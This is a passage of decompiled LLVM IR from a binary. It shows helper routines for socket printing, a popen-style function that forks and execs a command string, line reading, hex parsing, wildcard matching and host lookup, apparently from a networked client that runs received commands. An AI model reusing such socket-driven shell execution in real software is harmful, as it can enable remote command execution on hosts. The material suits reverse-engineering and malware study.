  uselistorder i32 %v1_89c0, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8960, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32*, i32)* @printchar, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8cfc, { 1, 0 }
  uselistorder label %dec_label_pc_8ce0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8cc4, { 7, 1, 0, 2, 3, 4, 6, 5 }
  uselistorder label %dec_label_pc_8ca4, { 1, 0 }
  uselistorder label %dec_label_pc_8a88, { 1, 0 }
  uselistorder label %dec_label_pc_8a40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a30, { 1, 0 }
  uselistorder label %dec_label_pc_89bc, { 1, 0 }
  uselistorder label %dec_label_pc_8948, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8d18 = load i32, i32* @r1, align 4
  store i32 %v6_8d18, i32* %stack_var_-12, align 4
  %v3_8d1c = load i32, i32* @fp, align 4
  store i32 36132, i32* %stack_var_-20, align 4
  %v2_8d20 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8d20, i32* @fp, align 4
  %v4_8d2c = ptrtoint i32* %stack_var_-12 to i32
  %v4_8d40 = call i32 @print(i32* null, i32 %arg1, i32 %v4_8d2c)
  store i32 %v3_8d1c, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d60 = load i32, i32* @fp, align 4
  store i32 36200, i32* %stack_var_-16, align 4
  %v2_8d64 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d64, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8d70 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d88 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8d70)
  store i32 %v3_8d60, i32* @fp, align 4
  ret i32 %v4_8d88

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8da4 = load i32, i32* @r2, align 4
  store i32 %v6_8da4, i32* %stack_var_-8, align 4
  %v3_8da8 = load i32, i32* @fp, align 4
  store i32 36272, i32* %stack_var_-16, align 4
  %v2_8dac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8dac, i32* @fp, align 4
  %v1_8dbc = call i32 @malloc(i32 2048)
  store i32 %v1_8dbc, i32* %stack_var_-44, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8dd8 = inttoptr i32 %v1_8dbc to i8*
  %v3_8dd8 = call i32 @__GI_memset(i8* %v2_8dd8, i32 0)
  %v2_8de4 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8e04 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8de4)
  %v3_8e0c = call i32 @strlen(i8* %v2_8dd8)
  %v2_8e1c = add i32 %v3_8e0c, %v1_8dbc
  %v3_8e24 = inttoptr i32 %v2_8e1c to i8*
  store i8 10, i8* %v3_8e24, align 1
  %v3_8e2c = call i32 @strlen(i8* %v2_8dd8)
  %v4_8e44 = call i32 @__libc_send(i32 %arg1, i32 %v1_8dbc, i32 %v3_8e2c, i32 16384)
  store i32 %v1_8dbc, i32* @r0, align 4
  %v0_8e54 = call i32 @free()
  store i32 %v3_8da8, i32* @fp, align 4
  ret i32 %v4_8e44

; uselistorder directives
  uselistorder i8* %v2_8dd8, { 1, 0, 2 }
  uselistorder i32 %v1_8dbc, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e70 = load i32, i32* @fp, align 4
  store i32 36472, i32* %stack_var_-4, align 4
  %v2_8e74 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e74, i32* @fp, align 4
  %v2_8e88 = load i8, i8* %arg2, align 1
  %v7_8e8c = icmp eq i8 %v2_8e88, 114
  br i1 %v7_8e8c, label %dec_label_pc_8ea4, label %dec_label_pc_8e94

dec_label_pc_8e94:                                ; preds = %entry
  %v2_8e98 = load i8, i8* %arg2, align 1
  %v7_8e9c = icmp eq i8 %v2_8e98, 119
  br i1 %v7_8e9c, label %dec_label_pc_8ea4, label %dec_label_pc_8eb8

dec_label_pc_8ea4:                                ; preds = %dec_label_pc_8e94, %entry
  %v1_8ea8 = add i32 %tmp, 1
  %v1_8eac = inttoptr i32 %v1_8ea8 to i8*
  %v2_8eac = load i8, i8* %v1_8eac, align 1
  %v2_8eb0 = icmp eq i8 %v2_8eac, 0
  br i1 %v2_8eb0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8e94, %dec_label_pc_8ea4
  br label %dec_label_pc_90d0

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8ea4
  %v2_8ec4 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8ecc = call i32 @__GI_pipe(i32 %v2_8ec4)
  store i32 %v1_8ecc, i32* @r0, align 4
  %v1_8ed4 = icmp slt i32 %v1_8ecc, 0
  br i1 %v1_8ed4, label %dec_label_pc_8edc, label %dec_label_pc_8ee8

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ec4
  br label %dec_label_pc_90d0

dec_label_pc_8ee8:                                ; preds = %dec_label_pc_8ec4
  %v2_8eec = load i32, i32* @global_var_2c58c.32, align 4
  %v2_8ef0 = icmp eq i32 %v2_8eec, 0
  br i1 %v2_8ef0, label %dec_label_pc_8ef8, label %dec_label_pc_8f78

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8ee8
  %v0_8ef8 = call i32 @getdtablesize()
  %v5_8f0c = icmp sgt i32 %v0_8ef8, 0
  br i1 %v5_8f0c, label %dec_label_pc_8f1c, label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8ef8
  br label %dec_label_pc_90d0

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ef8
  %v3_8f20 = mul i32 %v0_8ef8, 4
  %v1_8f28 = call i32 @malloc(i32 %v3_8f20)
  store i32 %v1_8f28, i32* @global_var_2c58c.32, align 4
  %v2_8f44 = icmp eq i32 %v1_8f28, 0
  br i1 %v2_8f44, label %dec_label_pc_8f4c, label %dec_label_pc_8f58

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f1c
  br label %dec_label_pc_90d0

dec_label_pc_8f58:                                ; preds = %dec_label_pc_8f1c
  store i32 %v3_8f20, i32* @r2, align 4
  %v2_8f74 = inttoptr i32 %v1_8f28 to i8*
  %v3_8f74 = call i32 @__GI_memset(i8* %v2_8f74, i32 0)
  store i32 %v3_8f74, i32* @r0, align 4
  br label %dec_label_pc_8f78

dec_label_pc_8f78:                                ; preds = %dec_label_pc_8ee8, %dec_label_pc_8f58
  %v0_8f78 = call i32 @__vfork()
  %v7_8f90 = icmp eq i32 %v0_8f78, -1
  br i1 %v7_8f90, label %dec_label_pc_8fa8, label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f78
  %v2_8f9c = icmp eq i32 %v0_8f78, 0
  br i1 %v2_8f9c, label %dec_label_pc_8fcc, label %dec_label_pc_906c

dec_label_pc_8fa8:                                ; preds = %dec_label_pc_8f78
  %v3_8fa8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fb0 = call i32 @__GI_close(i32 %v3_8fa8)
  %v1_8fbc = call i32 @__GI_close(i32 %tmp4)
  br label %dec_label_pc_90d0

dec_label_pc_8fcc:                                ; preds = %dec_label_pc_8f98
  %v3_8fd0 = load i8, i8* %arg2, align 1
  %v7_8fd4 = icmp eq i8 %v3_8fd0, 114
  br i1 %v7_8fd4, label %dec_label_pc_8fdc, label %dec_label_pc_9014

dec_label_pc_8fdc:                                ; preds = %dec_label_pc_8fcc
  %v7_8fe0 = icmp eq i32 %tmp4, 1
  br i1 %v7_8fe0, label %dec_label_pc_9004, label %dec_label_pc_8fe8

dec_label_pc_8fe8:                                ; preds = %dec_label_pc_8fdc
  %v4_8ff4 = call i32 @dup2(i32 %tmp4, i32 1, i32 %tmp)
  %v1_9000 = call i32 @__GI_close(i32 %tmp4)
  br label %dec_label_pc_9004

dec_label_pc_9004:                                ; preds = %dec_label_pc_8fdc, %dec_label_pc_8fe8
  %v3_9004 = load i32, i32* %stack_var_-32, align 4
  %v1_900c = call i32 @__GI_close(i32 %v3_9004)
  br label %dec_label_pc_9048

dec_label_pc_9014:                                ; preds = %dec_label_pc_8fcc
  %v3_9014 = load i32, i32* %stack_var_-32, align 4
  %v2_9018 = icmp eq i32 %v3_9014, 0
  br i1 %v2_9018, label %dec_label_pc_903c, label %dec_label_pc_9020

dec_label_pc_9020:                                ; preds = %dec_label_pc_9014
  %v4_902c = call i32 @dup2(i32 %v3_9014, i32 0, i32 %tmp)
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9038 = call i32 @__GI_close(i32 %v3_9030)
  br label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_9014, %dec_label_pc_9020
  %v1_9044 = call i32 @__GI_close(i32 %tmp4)
  br label %dec_label_pc_9048

dec_label_pc_9048:                                ; preds = %dec_label_pc_9004, %dec_label_pc_903c
  %v8_9060 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1dafc.34 to i32), i32 ptrtoint ([3 x i8]* @global_var_1d6f8.36 to i32), i32 ptrtoint ([3 x i8]* @global_var_1db04.38 to i32), i32 %arg1, i32 0)
  %v1_9068 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_906c

dec_label_pc_906c:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_9048
  %v2_9070 = load i8, i8* %arg2, align 1
  %v7_9074 = icmp eq i8 %v2_9070, 114
  br i1 %v7_9074, label %dec_label_pc_907c, label %dec_label_pc_9094

dec_label_pc_907c:                                ; preds = %dec_label_pc_906c
  %v3_907c = load i32, i32* %stack_var_-32, align 4
  %v1_908c = call i32 @__GI_close(i32 %tmp4)
  br label %dec_label_pc_90a8

dec_label_pc_9094:                                ; preds = %dec_label_pc_906c
  %v3_909c = load i32, i32* %stack_var_-32, align 4
  %v1_90a4 = call i32 @__GI_close(i32 %v3_909c)
  br label %dec_label_pc_90a8

dec_label_pc_90a8:                                ; preds = %dec_label_pc_907c, %dec_label_pc_9094
  %stack_var_-40.0 = phi i32 [ %v3_907c, %dec_label_pc_907c ], [ %tmp4, %dec_label_pc_9094 ]
  %v3_90ac = mul i32 %stack_var_-40.0, 4
  %v2_90b8 = load i32, i32* @global_var_2c58c.32, align 4
  %v2_90bc = add i32 %v2_90b8, %v3_90ac
  %v2_90c4 = inttoptr i32 %v2_90bc to i32*
  store i32 %v0_8f78, i32* %v2_90c4, align 4
  br label %dec_label_pc_90d0

dec_label_pc_90d0:                                ; preds = %dec_label_pc_8fa8, %dec_label_pc_8f4c, %dec_label_pc_8f10, %dec_label_pc_8edc, %dec_label_pc_8eb8, %dec_label_pc_90a8
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8edc ], [ -1, %dec_label_pc_8f4c ], [ -1, %dec_label_pc_8fa8 ], [ %stack_var_-40.0, %dec_label_pc_90a8 ], [ -1, %dec_label_pc_8f10 ], [ -1, %dec_label_pc_8eb8 ]
  store i32 %v3_8e70, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f78, { 1, 2, 0 }
  uselistorder i32 %v3_8f20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp4, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_90d0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_90a8, { 1, 0 }
  uselistorder label %dec_label_pc_906c, { 1, 0 }
  uselistorder label %dec_label_pc_9048, { 1, 0 }
  uselistorder label %dec_label_pc_903c, { 1, 0 }
  uselistorder label %dec_label_pc_9004, { 1, 0 }
  uselistorder label %dec_label_pc_8f78, { 1, 0 }
  uselistorder label %dec_label_pc_8eb8, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_910c = load i32, i32* @global_var_2c58c.32, align 4
  %v2_9110 = icmp eq i32 %v2_910c, 0
  br i1 %v2_9110, label %dec_label_pc_9264, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %entry
  %v3_911c = mul i32 %arg1, 4
  %v2_912c = add i32 %v2_910c, %v3_911c
  %v1_9130 = inttoptr i32 %v2_912c to i32*
  %v2_9130 = load i32, i32* %v1_9130, align 4
  %v2_9134 = icmp eq i32 %v2_9130, 0
  br i1 %v2_9134, label %dec_label_pc_9264, label %dec_label_pc_9148

dec_label_pc_9148:                                ; preds = %dec_label_pc_9118
  %v1_914c = call i32 @__GI_close(i32 %arg1)
  %v2_9150 = ptrtoint i32* %stack_var_-36 to i32
  %v2_9158 = call i32 @sigemptyset(i32* nonnull %stack_var_-36)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9168 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 2)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9178 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 3)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9188 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 1)
  %v2_9190 = ptrtoint i32* %stack_var_-28 to i32
  %v4_919c = call i32 @__GI_sigprocmask(i32 0, i32 %v2_9150, i32 %v2_9190, i32 %v2_9150)
  %v2_91bc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_9148
  %v2_91b0 = load i32, i32* @global_var_2c58c.32, align 4
  %v2_91b4 = add i32 %v2_91b0, %v3_911c
  %v1_91b8 = inttoptr i32 %v2_91b4 to i32*
  %v2_91b8 = load i32, i32* %v1_91b8, align 4
  store i32 %v2_91b8, i32* @r0, align 4
  store i32 %v2_91bc, i32* @r1, align 4
  %v3_91cc = call i32 @__libc_waitpid(i32 %v2_91b8, i32 %v2_91bc, i32 0)
  %v3_91dc = icmp eq i32 %v3_91cc, -1
  %v8_91dc = icmp eq i32 %v3_91cc, -1
  br i1 %v3_91dc, label %dec_label_pc_91e4, label %dec_label_pc_91f8

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91a0
  %v0_91e4 = call i32 @__GI___errno_location()
  %v1_91ec = inttoptr i32 %v0_91e4 to i32*
  %v2_91ec = load i32, i32* %v1_91ec, align 4
  %v7_91f0 = icmp eq i32 %v2_91ec, 4
  br i1 %v7_91f0, label %dec_label_pc_91a0, label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_91a0, %dec_label_pc_91e4
  %v4_9208 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_9190, i32 0, i32 %v2_9190)
  %v3_9210 = mul i32 %tmp6, 4
  %v2_921c = load i32, i32* @global_var_2c58c.32, align 4
  %v2_9220 = add i32 %v2_921c, %v3_9210
  %v2_9228 = inttoptr i32 %v2_9220 to i32*
  store i32 0, i32* %v2_9228, align 4
  br i1 %v8_91dc, label %dec_label_pc_9264, label %dec_label_pc_9238

dec_label_pc_9238:                                ; preds = %dec_label_pc_91f8
  %v3_9238 = load i32, i32* %stack_var_-40, align 4
  %v1_9244 = and i32 %v3_9238, 65280
  %v3_92481 = udiv i32 %v1_9244, 256
  br label %dec_label_pc_9264

dec_label_pc_9264:                                ; preds = %dec_label_pc_9238, %dec_label_pc_91f8, %entry, %dec_label_pc_9118
  %storemerge = phi i32 [ -1, %dec_label_pc_9118 ], [ -1, %entry ], [ %v3_92481, %dec_label_pc_9238 ], [ -1, %dec_label_pc_91f8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_91bc, { 1, 0 }
  uselistorder i32 %v2_9190, { 1, 0, 2 }
  uselistorder i32 %v2_9150, { 0, 1, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_911c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_2c58c.32, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9264, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91f8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_92ec

dec_label_pc_92ac:                                ; preds = %dec_label_pc_92fc
  %v1_92c8 = call i32 @__GI_read(i32 %arg3)
  %v1_92d8 = add nuw i32 %storemerge25, 1
  %v7_92e4 = icmp eq i32 %v1_92c8, 1
  br i1 %v7_92e4, label %dec_label_pc_92ec, label %dec_label_pc_931c

dec_label_pc_92ec:                                ; preds = %entry, %dec_label_pc_92ac
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_92d8, %dec_label_pc_92ac ]
  %v6_92f8 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92f8, label %dec_label_pc_92fc, label %dec_label_pc_931c

dec_label_pc_92fc:                                ; preds = %dec_label_pc_92ec
  %v2_9308 = add i32 %storemerge25, %arg1
  %v1_930c = add i32 %v2_9308, -1
  %v1_9310 = inttoptr i32 %v1_930c to i8*
  %v2_9310 = load i8, i8* %v1_9310, align 1
  %v7_9314 = icmp eq i8 %v2_9310, 10
  br i1 %v7_9314, label %dec_label_pc_931c, label %dec_label_pc_92ac

dec_label_pc_931c:                                ; preds = %dec_label_pc_92fc, %dec_label_pc_92ec, %dec_label_pc_92ac
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92fc ], [ 1, %dec_label_pc_92ec ], [ %v1_92c8, %dec_label_pc_92ac ]
  %v2_9320 = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_9320, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_92c8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_92ec, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_93a43 = load i8, i8* %arg1, align 1
  %v2_93a85 = icmp eq i8 %v2_93a43, 0
  br i1 %v2_93a85, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_9370:                                ; preds = %dec_label_pc_93b0
  %v3_9374 = mul i32 %stack_var_-20.07, 16
  %v2_937c = load i8, i8* %stack_var_-28.06, align 1
  %v3_937c = zext i8 %v2_937c to i32
  %v4_9388 = mul nuw nsw i32 %v3_937c, 4
  %v5_9388 = add i32 %v4_9388, ptrtoint (i32* @global_var_1db08.41 to i32)
  %v6_9388 = inttoptr i32 %v5_9388 to i32*
  %v7_9388 = load i32, i32* %v6_9388, align 4
  %v2_938c = or i32 %v7_9388, %v3_9374
  %v1_9398 = add i32 %v4_93a08, 1
  %v5_939c = inttoptr i32 %v1_9398 to i8*
  %v2_93a4 = load i8, i8* %v5_939c, align 1
  %v2_93a8 = icmp eq i8 %v2_93a4, 0
  br i1 %v2_93a8, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %entry, %dec_label_pc_9370
  %v4_93a08 = phi i32 [ %v1_9398, %dec_label_pc_9370 ], [ %tmp, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_938c, %dec_label_pc_9370 ], [ 0, %entry ]
  %stack_var_-28.06 = phi i8* [ %v5_939c, %dec_label_pc_9370 ], [ %arg1, %entry ]
  %v1_93b4 = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_93b4, label %dec_label_pc_93bc, label %dec_label_pc_9370

dec_label_pc_93bc:                                ; preds = %dec_label_pc_9370, %dec_label_pc_93b0, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_938c, %dec_label_pc_9370 ], [ %stack_var_-20.07, %dec_label_pc_93b0 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_93bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @fp, align 4
  store i32 37856, i32* %stack_var_-4, align 4
  %v2_93dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_93dc, i32* @fp, align 4
  %v2_93f0 = load i8, i8* %arg1, align 1
  %v7_93fc = icmp eq i8 %v2_93f0, 42
  br i1 %v7_93fc, label %dec_label_pc_9430, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %entry
  %v7_9408 = icmp eq i8 %v2_93f0, 63
  br i1 %v7_9408, label %dec_label_pc_94a0, label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_9404
  %v2_9414 = icmp eq i8 %v2_93f0, 0
  br i1 %v2_9414, label %dec_label_pc_9420, label %dec_label_pc_94f8

dec_label_pc_9420:                                ; preds = %dec_label_pc_9410
  %v2_9424 = load i8, i8* %tmp, align 1
  %v3_9424 = zext i8 %v2_9424 to i32
  br label %dec_label_pc_956c

dec_label_pc_9430:                                ; preds = %entry
  %v1_9434 = add i32 %tmp8, 1
  %v3_9440 = inttoptr i32 %v1_9434 to i8*
  %v4_9440 = call i32 @wildString(i8* %v3_9440, i32 %arg2)
  %v2_9448 = icmp eq i32 %v4_9440, 0
  br i1 %v2_9448, label %dec_label_pc_948c, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9430
  %v2_9454 = load i8, i8* %tmp, align 1
  %v2_9458 = icmp eq i8 %v2_9454, 0
  br i1 %v2_9458, label %dec_label_pc_9494, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_9450
  %v1_9464 = add i32 %arg2, 1
  %v4_9470 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9464)
  %v2_9478 = icmp eq i32 %v4_9470, 0
  br i1 %v2_9478, label %dec_label_pc_948c, label %dec_label_pc_9494

dec_label_pc_948c:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9430
  br label %dec_label_pc_9494

dec_label_pc_9494:                                ; preds = %dec_label_pc_9450, %dec_label_pc_9460, %dec_label_pc_948c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_948c ], [ 1, %dec_label_pc_9460 ], [ 1, %dec_label_pc_9450 ]
  br label %dec_label_pc_956c

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9404
  %v2_94a4 = load i8, i8* %tmp, align 1
  %v2_94a8 = icmp eq i8 %v2_94a4, 0
  br i1 %v2_94a8, label %dec_label_pc_94ec, label %dec_label_pc_94b0

dec_label_pc_94b0:                                ; preds = %dec_label_pc_94a0
  %v1_94b4 = add i32 %tmp8, 1
  %v1_94bc = add i32 %arg2, 1
  %v2_94c8 = inttoptr i32 %v1_94b4 to i8*
  %v3_94c8 = call i32 @wildString(i8* %v2_94c8, i32 %v1_94bc)
  %v2_94d0 = icmp ne i32 %v3_94c8, 0
  %. = zext i1 %v2_94d0 to i32
  br label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94b0, %dec_label_pc_94a0
  %storemerge2 = phi i32 [ 1, %dec_label_pc_94a0 ], [ %., %dec_label_pc_94b0 ]
  br label %dec_label_pc_956c

dec_label_pc_94f8:                                ; preds = %dec_label_pc_9410
  %v2_94fc = load i8, i8* %arg1, align 1
  %v3_94fc = zext i8 %v2_94fc to i32
  %v1_9504 = call i32 @__GI_toupper(i32 %v3_94fc)
  store i32 %v1_9504, i32* @r4, align 4
  %v2_9510 = load i8, i8* %tmp, align 1
  %v3_9510 = zext i8 %v2_9510 to i32
  %v1_9518 = call i32 @__GI_toupper(i32 %v3_9510)
  %v0_9520 = load i32, i32* @r4, align 4
  %v9_9520 = icmp eq i32 %v0_9520, %v1_9518
  br i1 %v9_9520, label %dec_label_pc_9528, label %dec_label_pc_9564

dec_label_pc_9528:                                ; preds = %dec_label_pc_94f8
  %v1_952c = add i32 %tmp8, 1
  %v1_9534 = add i32 %arg2, 1
  %v2_9540 = inttoptr i32 %v1_952c to i8*
  %v3_9540 = call i32 @wildString(i8* %v2_9540, i32 %v1_9534)
  %v2_9548 = icmp ne i32 %v3_9540, 0
  %.7 = zext i1 %v2_9548 to i32
  br label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_9528, %dec_label_pc_94f8
  %storemerge = phi i32 [ 1, %dec_label_pc_94f8 ], [ %.7, %dec_label_pc_9528 ]
  br label %dec_label_pc_956c

dec_label_pc_956c:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_9494, %dec_label_pc_9420, %dec_label_pc_9564
  %stack_var_-48.0 = phi i32 [ %storemerge3, %dec_label_pc_9494 ], [ %storemerge2, %dec_label_pc_94ec ], [ %v3_9424, %dec_label_pc_9420 ], [ %storemerge, %dec_label_pc_9564 ]
  store i32 %v3_93d8, i32* @r4, align 4
  store i32 %v6_93d8, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_956c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9494, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_95a0 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_95a0, i32* %arg2, align 4
  %v3_95b8 = icmp eq i32 %v1_95a0, -1
  %. = zext i1 %v3_95b8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_95f8 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_95f8 to i8*
  %v2_96303 = load i8, i8* %storemerge2, align 1
  %v2_96345 = icmp eq i8 %v2_96303, 0
  br i1 %v2_96345, label %dec_label_pc_963c, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %entry, %dec_label_pc_9600
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_9600 ], [ %storemerge2, %entry ]
  %storemerge.in6 = phi i32 [ %v1_9624, %dec_label_pc_9600 ], [ %v0_95f8, %entry ]
  %v2_9604 = load i8, i8* %storemerge7, align 1
  %v3_9604 = zext i8 %v2_9604 to i32
  store i32 %v3_9604, i32* %r0.global-to-local, align 4
  %v1_960c = call i32 @__GI_toupper(i32 %v3_9604)
  store i32 %v1_960c, i32* %r0.global-to-local, align 4
  %v1_961c = trunc i32 %v1_960c to i8
  store i8 %v1_961c, i8* %storemerge7, align 1
  %v1_9624 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_9624 to i8*
  %v2_9630 = load i8, i8* %storemerge, align 1
  %v2_9634 = icmp eq i8 %v2_9630, 0
